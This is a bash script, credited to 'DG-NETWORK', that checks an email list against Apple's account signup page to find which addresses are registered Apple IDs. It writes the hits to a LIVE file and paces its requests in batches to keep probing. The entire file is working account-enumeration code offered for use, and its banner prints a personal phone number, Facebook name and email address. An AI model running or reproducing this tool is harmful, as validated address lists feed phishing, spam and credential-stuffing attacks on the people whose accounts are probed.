#!/bin/bash


# Email APPLE VAILD
# Coded By Credit: © DG-NETWORK™
# Thanks to malhadijr
 
# text style
 
BOLD='\e[1m'
 
# text color
 
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAENTA='\033[0;35m'
CY='\033[0;36m'
TURQUOISE='\033[0;37m'
 
LIGHTRED='\033[0;91m'
LIGHTGREEN='\033[0;92m'
LIGHTBLUE='\033[0;96m'
 
# background color
 
BACKGREEN='\033[0;42m'
BACKBLUE='\033[0;44m'
 
# no style
 
NC='\033[0m'
 
 
header(){
printf    "\n"

}
 
#-----
clear
header
#-----

echo ""
printf "${LIGHTBLUE}_-_-_-_[ WELCOME TO APPLE VAILED DG-NETWORK™ ]_-_-_-_\n"
sleep 1
printf "${LIGHTRED}======================================================\n"
sleep 1
printf "${LIGHTBLUE}#         WhatsApp     : 0878 6433 4333              #\n"
sleep 1
printf "${LIGHTBLUE}#         Facebook     : Syamsul Hadi Dahe       -   #\n"
sleep 1
printf "${LIGHTBLUE}#         E-mail       : nesyamsoel@gmail.com        #\n"
sleep 1
printf "${LIGHTGREEN}#----------------------------------------------------#\n"
sleep 1
printf "${LIGHTBLUE}#              Credit: © DG-NETWORK™                 #\n"
sleep 1
printf "${LIGHTGREEN}#----------------------------------------------------#\n"
sleep 1
printf "${LIGHTBLUE}#             Fixed : December 22, 2017              #\n"
sleep 1
printf "${LIGHTRED}======================================================\n\n"
sleep 1

 
# end of banyol
sleep 1

ngecek_email(){ # CHECK VALID
	local jsessionid=$(curl -s --head https://ams.apple.com/pages/SignUp.jsf | grep -Po "(?<=Set-Cookie: JSESSIONID=)[^;]*")
	local used=$(curl -s -D - "https://ams.apple.com/pages/SignUp.jsf;jsessionid=$JSESSIONID" \
	-H "Cookie: JSESSIONID=$jsessionid;" \
	-H "User-Agent: $5" \
	-d "SignUpForm=SignUpForm&SignUpForm%3AemailField=$1&SignUpForm%3AblueCenter=Continue&javax.faces.ViewState=j_id1")
	if [[ $used =~ "200 OK" ]]; then
		if [[ $used =~ "This email address is already registered as an Apple ID, please sign in." ]]; then
			printf "${B}${LIGHTGREEN}[LIVE]${CC} ${1} ${TURQUOISE}${B}=> ${YELLOW}${B}Credit: © DG-NETWORK™ ${TURQUOISE}${B}| ${B}${LIGHTGREEN}Valid APPLE. \n"
			echo $1 >> $2	
		else
			printf "${B}${RED}[DIE]${CC} ${1} ${TURQUOISE}${B}=> ${YELLOW}${B}Credit: © DG-NETWORK™ ${TURQUOISE}${B}| ${B}${RED}Invalid APPLE. \n"
			echo $1 >> $3	
		fi
	else
		printf "${B}${CY}[UNKNOWN]${CC} ${1} ${TURQUOISE}${B}=> ${YELLOW}${B}Credit: © DG-NETWORK™ ${TURQUOISE}${B}| ${B}${CY}Unknown. \n"
		echo $1 >> $4
	fi
}

# CHECK SPECIAL VAR FOR MAILIST
if [[ -z $1 ]]; then
	printf "[+] ./apple.sh Email.txt ${VIOLET}\n"
	printf "${NC}"
	exit 1
fi


# CHECK OUTPUT FOLDER
Output='Output' # Change Output Folder
if [[ ! -d $Output ]]; then
	printf "${RED}[?]${DF} ${B}No output Folder${CC}\n"
	sleep 1
	printf "${GREEN}[+]${DF} ${B}Create Output Folder${CC}\n"
	sleep 1
	mkdir $Output
	if [[ -d $Output ]]; then
		printf "${VIOLET}[+]${DF} ${B}Output Folder Created${CC}\n\n"
		sleep 1
	else
		printf "${RED}[-]${DF} ${B}Output Folder Failed To Created${CC}\n"
		sleep 1
	fi
else
	printf "${VIOLET}[+]${DF} ${B}Output Folder Found${CC}\n"
	sleep 1
	printf "${VIOLET}[+]${DF} ${B}Use Output Folder${CC}\n\n"
	sleep 1
fi

# TOUCH OUTPUT FILE
VALID="${Output}/LIVE.txt"
INVALID="${Output}/DIE.txt"
UNKNOWN="${Output}/unknown.txt"
touch $VALID
printf "$VIOLET[+]${DF}${B} $VALID Created${CC}\n"
touch $INVALID
printf "$VIOLET[+]${DF}${B} $INVALID Created${CC}\n"
touch $UNKNOWN
printf "$VIOLET[+]${DF}${B} $UNKNOWN Created${CC}\n\n"

# CHECK LINES IN MAILIST
lines=$(wc -l $1 | cut -f1 -d' ')
printf "${whait}[+]${DF}${B} ${lines} Email Found In ${1}${CC}\n"
sleep 1
printf "	${TURQUOISE}- ${RED}Gmail:	`grep -c "@gmail" $1`\n"
sleep 1
printf "	${TURQUOISE}- ${BLUE}Hotmail:	`grep -c "@hotmail" $1`\n"
sleep 1
printf "	${TURQUOISE}- ${BLUE}MSN:		`grep -c "@msn" $1`\n"
sleep 1
printf "	${TURQUOISE}- ${BLUE}Live:		`grep -c "@live" $1`\n"
sleep 1
printf "	${TURQUOISE}- ${BLUE}Outlook:	`grep -c "@outlook" $1`\n"
sleep 1
printf "	${TURQUOISE}- ${MAENTA}Yahoo:	`grep -c "@yahoo" $1`\n"
sleep 1
printf "	${TURQUOISE}- ${LIGHTBLUE}AoL:		`grep -c "@aol" $1`\n"
sleep 1
printf "${LIGHTGREEN}================================================================\n\n"
sleep 10
clear

printf "${LIGHTGREEN}Checking . . .\n\n"
sleep 5
# OPTIONAL
persend=15
setleep=5

# MAIN
IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))'
itung=1
STARTTIME=$(date +%s)
for (( i = 0; i < "${#mailist[@]}"; i++ )); do
username="${mailist[$i]}"
set_kirik=$(expr $itung % $persend)
        if [[ $set_kirik == 0 && $itung > 0 ]]; then
                sleep $setleep
        fi
        ngecek_email $username $VALID $INVALID $UNKNOWN $UA &
        grep -v -- "$username" $1 > temp && mv temp $1
        itung=$[$itung+1]
done
wait
ENDTIME=$(date +%s)

# RESULT
printf "\n ${LIGHTGREEN}Finishing . . . \n"
sleep 5
clear
printf "\n${pp}Done ! $[$ENDTIME - $STARTTIME] Second For Check ${lines} Email ${CC}\n"
sleep 1

#READ LINES OUTPUT
T_VALID=$(wc -l $VALID | cut -f1 -d' ')
T_INVALID=$(wc -l $INVALID | cut -f1 -d' ')
T_UNKNOWN=$(wc -l $UNKNOWN | cut -f1 -d' ')

printf "${B}${LIGHTGREEN}LIVES : $T_VALID ${TURQUOISE}| ${B}${RED}DIE : $T_INVALID ${TURQUOISE}| ${B}${CY}UNKNOWN : $T_UNKNOWN\n$CC\n\n"
sleep 1
printf "${LIGHTBLUE}++============ [ Credit: © DG-NETWORK™ ] ===========++\n\n"
